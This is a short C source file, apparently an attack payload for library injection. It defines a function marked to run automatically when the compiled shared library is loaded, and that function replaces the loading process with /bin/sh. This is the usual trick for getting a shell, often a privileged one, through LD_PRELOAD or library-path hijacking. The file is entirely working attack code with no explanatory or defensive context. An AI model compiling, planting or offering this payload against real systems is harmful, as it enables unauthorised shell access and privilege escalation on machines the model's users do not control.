#include <unistd.h>

__attribute__((constructor))
void shell()
{
    execve("/bin/sh", NULL, NULL);
}
